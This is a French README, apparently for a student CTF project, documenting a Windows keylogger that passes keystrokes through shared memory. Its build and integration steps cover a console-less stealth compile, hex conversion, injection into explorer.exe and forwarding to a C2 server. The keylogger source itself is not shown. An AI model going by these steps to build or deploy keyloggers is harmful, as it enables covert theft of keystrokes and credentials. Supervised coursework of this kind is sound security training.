# 🎯 Keylogger Payload - Shared Memory Version

**Projet EPITECH T-VIR CTF** - Usage éducatif uniquement

---

## 📋 **Description**

Keylogger qui utilise la **mémoire partagée** pour communiquer avec l'agent. Pas de fichier sur disque, communication directe via shared memory.

---

## 📁 **Structure**

```
keylogger_payload/
├── keylogger_shmem.c       # Keylogger (écrit dans shared memory)
├── keylogger_shmem.exe     # Compiled keylogger
├── reader_test.c           # Test reader (simule l'agent)
├── reader_test.exe         # Compiled reader
├── build_shmem.sh          # Script de compilation
├── exe_to_bytes.py         # Convertisseur EXE → Hex bytes
├── SHARED_MEMORY.md        # Documentation détaillée
└── README.md               # Ce fichier
```

---

## 🚀 **Quick Start**

### **1. Compiler**

```bash
wsl bash build_shmem.sh
```

### **2. Tester**

**Terminal 1 (Keylogger):**
```powershell
cd C:\Users\Odessa\Epitech\T-VIR\agent_program\keylogger_payload
.\keylogger_shmem.exe
```

**Terminal 2 (Reader):**
```powershell
.\reader_test.exe
```

Tapez des touches → Elles apparaissent dans le Terminal 2 ! ✅

---

## 🔗 **Intégration avec l'agent**

1. **Compiler pour production** (sans console):
   ```bash
   x86_64-w64-mingw32-gcc keylogger_shmem.c -o keylogger.exe \
       -mwindows -O2 -s -static -luser32 -lkernel32
   ```

2. **Convertir en bytes hex**:
   ```bash
   python3 exe_to_bytes.py keylogger.exe payload.txt
   ```

3. **L'agent injecte** le payload dans un processus

4. **L'agent lit** la mémoire partagée `"Global\\KeyloggerSharedMem"`

5. **L'agent envoie** les données au C2

Voir [SHARED_MEMORY.md](SHARED_MEMORY.md) pour les détails d'implémentation.

---

## 📊 **Architecture**

```
Agent
  │
  ├─→ Inject keylogger.exe dans explorer.exe
  │
  └─→ Lit périodiquement "Global\\KeyloggerSharedMem"
       │
       └─→ Envoie au C2 via JSON
```

---

## 🛠️ **Prérequis**

- **MinGW-w64** cross-compiler: `sudo apt install mingw-w64`
- **Python 3** pour la conversion en bytes
- **WSL** ou environnement Linux pour compiler

---

## 📚 **Documentation**

- [SHARED_MEMORY.md](SHARED_MEMORY.md) - Guide complet d'intégration
- Voir le code de `reader_test.c` pour un exemple de lecture

---

## ⚠️ **Avertissement**

Ce code est destiné **uniquement** à un usage éducatif dans le cadre du CTF EPITECH T-VIR.
L'utilisation non autorisée de keyloggers est **illégale**.

---

**Projet supervisé par l'équipe pédagogique EPITECH**
